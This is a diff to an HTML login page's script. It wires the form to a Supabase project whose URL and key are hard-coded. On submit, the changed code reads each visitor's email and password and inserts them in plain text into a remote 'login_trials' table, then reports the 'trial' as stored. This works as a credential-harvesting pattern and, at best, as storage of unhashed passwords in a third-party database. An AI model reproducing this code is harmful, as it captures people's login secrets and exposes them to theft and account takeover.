@@ -115,36 +115,41 @@
 
   <!-- Supabase Integration -->
   <script type="module">
-    import { createClient } from "https://esm.sh/@supabase/supabase-js";
+  import { createClient } from "https://esm.sh/@supabase/supabase-js";
 
-    // Replace these with your Supabase credentials
-    const SUPABASE_URL = "https://pkewlhgsejappgfkirct.supabase.co";
-    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBrZXdsaGdzZWphcHBnZmtpcmN0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjIzNjM1NDEsImV4cCI6MjA3NzkzOTU0MX0.Eu20VblWf-spd4NgdpPMwfrB7SYoS8tuMwqm9CdQeNY";
+  // Your Supabase credentials
+  const SUPABASE_URL = "https://pkewlhgsejappgfkirct.supabase.co";
+  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBrZXdsaGdzZWphcHBnZmtpcmN0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjIzNjM1NDEsImV4cCI6MjA3NzkzOTU0MX0.Eu20VblWf-spd4NgdpPMwfrB7SYoS8tuMwqm9CdQeNY";
+  const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
+  document.getElementById("loginForm").addEventListener("submit", async (e) => {
+    e.preventDefault();
 
-    document.getElementById("loginForm").addEventListener("submit", async (e) => {
-    e.preventDefault()
-    const username = document.getElementById("username").value
-    const password = document.getElementById("password").value
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
 
-    // Save to Supabase
+    // Insert into Supabase table "login_trials"
     const { data, error } = await supabase
       .from("login_trials")
-      .insert([{ username, password }])
+      .insert([{ email, password }]);
 
     if (error) {
-      console.error(error)
-      alert("Something went wrong.")
+      console.error("Supabase insert error:", error);
+      alert("Something went wrong while saving the trial.");
     } else {
-      alert("Stored successfully (trial only)")
+      alert("Trial stored successfully!");
     }
-  })
-    // Splash transition
-    window.addEventListener('load',()=>{
-      const splash=document.getElementById('splash');
-      setTimeout(()=>splash.classList.add('hide'),2000);
-    });
-  </script>
+
+    // Optional: clear form after save
+    e.target.reset();
+  });
+
+  // Splash transition
+  window.addEventListener('load', () => {
+    const splash = document.getElementById('splash');
+    setTimeout(() => splash.classList.add('hide'), 2000);
+  });
+</script>
+
 </body>
 </html>
